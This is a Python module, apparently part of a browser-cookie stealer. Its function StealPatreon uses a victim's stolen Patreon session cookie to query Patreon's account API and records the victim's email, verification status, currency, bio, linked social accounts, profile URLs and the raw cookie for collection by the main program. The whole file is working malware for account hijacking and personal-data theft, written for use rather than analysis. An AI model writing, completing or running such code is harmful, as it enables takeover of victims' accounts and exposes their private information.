import aiohttp # type: ignore
from main import ListFonction, error_handler


async def StealPatreon(self, cookie, browser: str) -> None:
    try:
        patreonurl = "https://www.patreon.com/api/current_user?include=connected_socials%2Ccampaign.connected_socials&json-api-version=1.0"
        headers = {
            "Cookie": f'session_id={cookie}',
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        }

        async with aiohttp.ClientSession(headers=headers, connector=aiohttp.TCPConnector(ssl=True)) as session:
            async with session.get(patreonurl) as response:
                data = await response.json()

        req = data["data"]["attributes"].get
        social_connections = data.get("data", {}).get("attributes", {}).get("social_connections", {})
        created = req("created", "Couldn't get creation date")
        email = req("email", "Couldn't get email")
        verified = '✅' if req("is_email_verified", False) else '❌'
        currency = req("patron_currency", "Couldn't get currency")
        bio = req("about", "Couldn't get bio/No bio")
        non_null_social_connections = [key for key, value in social_connections.items() if value is not None]
        url = data["links"].get("self", "Couldn't get URL")
        url2 = req("url", "Couldn't get URL")
        social_connection_names = "\n".join([f"{key.capitalize()}" for key in non_null_social_connections]) if non_null_social_connections else "No connections"

    except Exception as e: 
        error_handler(f"patreon session error - {str(e)}")
    else:
        ListFonction.PatreonAccounts.append(f"Email: {email}\nVerified: {verified}\nCreated: {created}\nCurrency: {currency}\nBio: {bio}\nSocial Connections:\n{social_connection_names}\nProfile URL: {url}\nAdditional URL: {url2}\nBrowser: {browser}\nCookie: {cookie}")
